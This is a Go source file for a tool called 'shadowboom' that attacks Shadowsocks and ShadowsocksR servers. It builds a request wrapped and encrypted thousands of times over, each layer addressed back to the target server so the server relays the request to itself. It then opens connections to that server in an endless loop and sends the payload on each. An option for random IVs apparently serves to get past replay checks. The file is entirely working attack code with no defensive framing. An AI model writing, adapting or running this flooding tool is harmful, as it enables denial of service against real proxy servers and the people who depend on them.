package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	cObfs "github.com/Dreamacro/clash/transport/ssr/obfs"
	cProtocol "github.com/Dreamacro/clash/transport/ssr/protocol"
	"sing/common"
	"sing/common/buf"
	"sing/common/socksaddr"
	"sing/protocol/shadowsocks"
	_ "sing/protocol/shadowsocks/shadowstream"
)

var (
	address  string
	port     int
	method   string
	password string

	obfs          string
	obfsParam     string
	protocol      string
	protocolParam string

	ring     int
	uniqueIV bool
)

func main() {
	fs := flag.NewFlagSet("shadowboom", flag.ExitOnError)
	fs.StringVar(&address, "address", "", "server address")
	fs.IntVar(&port, "port", 0, "server port")
	fs.StringVar(&method, "method", "", "server cipher")
	fs.StringVar(&password, "password", "", "server password")

	fs.StringVar(&obfs, "obfs", "", "shadowsocksr obfuscate")
	fs.StringVar(&obfsParam, "obfs-param", "", "shadowsocksr obfuscate parameter")
	fs.StringVar(&protocol, "protocol", "", "shadowsocksr protocol")
	fs.StringVar(&protocolParam, "protocol-param", "", "shadowsocksr protocol parameter")

	fs.IntVar(&ring, "ring", 5000, "requests")
	fs.BoolVar(&uniqueIV, "uniqueIV", false, "use unique iv for each request")

	_ = fs.Parse(os.Args[1:])

	if common.IsBlank(method) {
		fs.Usage()
		log.Fatal("method not defined")
	}

	if common.IsBlank(password) {
		fs.Usage()
		log.Fatal("password not defined")
	}

	cipher, err := shadowsocks.CreateCipher(method)
	if err != nil {
		log.Fatal(err)
	}

	key := shadowsocks.Key([]byte(password), cipher.KeySize())

	/*if _, isAEAD := cipher.(*shadowsocks.AEADCipher); isAEAD {
		log.Fatal("not a stream cipher: ", method)
	}*/

	ipAddr, err := net.ResolveIPAddr("ip", address)
	if err != nil {
		log.Fatal("unable to resolve server address: ", address, ": ", err)
	}
	addr := socksaddr.AddrFromIP(ipAddr.IP)

	var sharedPayload *bytes.Buffer
	if !uniqueIV {
		sharedPayload = createRequest(cipher, key, addr, uint16(port))
	}

	for {
		var payload *bytes.Buffer
		if !uniqueIV {
			payload = sharedPayload
		} else {
			payload = createRequest(cipher, key, addr, uint16(port))
		}

		conn, err := net.DialTCP("tcp", nil, &net.TCPAddr{
			IP:   ipAddr.IP,
			Port: port,
		})
		if err != nil {
			log.Print("failed to connect to server: ", err)
			return
		}
		log.Print(fmt.Sprint("open connection to ", address, ":", port))
		_, err = conn.Write(payload.Bytes())
		if err != nil {
			log.Print("failed to write request: ", err)
			return
		}

		if uniqueIV {
			payload.Reset()
		}

		go func() {
			_, err = io.Copy(io.Discard, conn)
		}()

	}
}

func createRequest(cipher shadowsocks.Cipher, key []byte, addr socksaddr.Addr, port uint16) *bytes.Buffer {
	fmt.Println("creating payload")
	content := new(bytes.Buffer)
	iv := buf.New()
	iv.WriteZeroN(cipher.IVSize())
	defer iv.Release()

	var (
		obfsInstance     cObfs.Obfs
		protocolInstance cProtocol.Protocol

		overhead int
		err      error
	)

	if common.IsNotBlank(obfs) && obfs != "plain" {
		obfsInstance, overhead, err = cObfs.PickObfs(obfs, &cObfs.Base{
			Host:   address,
			Port:   int(port),
			Key:    key,
			IVSize: cipher.IVSize(),
			Param:  obfsParam,
		})
		if err != nil {
			log.Fatalln(err)
		}
	}

	if common.IsNotBlank(protocol) && protocol != "origin" {
		protocolInstance, err = cProtocol.PickProtocol(protocol, &cProtocol.Base{
			Key:      key,
			Overhead: overhead,
			Param:    protocolParam,
		})
		if err != nil {
			log.Fatalln(err)
		}
	}

	for i := 0; i < ring; i++ {
		var buffer bytes.Buffer
		var writer io.Writer = &buffer

		if uniqueIV {
			iv.Reset()
			iv.WriteRandom(cipher.IVSize())
		}

		if obfsInstance != nil {
			writer = obfsInstance.StreamConn(common.NewWritConn(writer))
		}

		_, err = writer.Write(iv.Bytes())
		if err != nil {
			fmt.Println(err)
			break
		}
		writer, err = cipher.NewEncryptionWriter(key, iv.Bytes(), writer)
		if err != nil {
			fmt.Println(err)
			break
		}

		if protocolInstance != nil {
			writer = protocolInstance.StreamConn(common.NewWritConn(writer), iv.Bytes())
		}

		var addressAndPort bytes.Buffer
		shadowsocks.AddressSerializer.WriteAddressAndPort(&addressAndPort, addr, port)
		_, err = writer.Write(addressAndPort.Bytes())
		if err != nil {
			fmt.Println(err)
			break
		}
		_, err = writer.Write(content.Bytes())
		if err != nil {
			fmt.Println(err)
			break
		}

		addressAndPort.Reset()
		content.Reset()

		if i%1000 == 0 {
			log.Print("ring ", i, ": ", byteSize(buffer.Len()))
		}
		content = &buffer
	}
	log.Print("finished ", ring, ": ", byteSize(content.Len()))
	return content
}

func byteSize(b int) string {
	const unit = 1000
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}
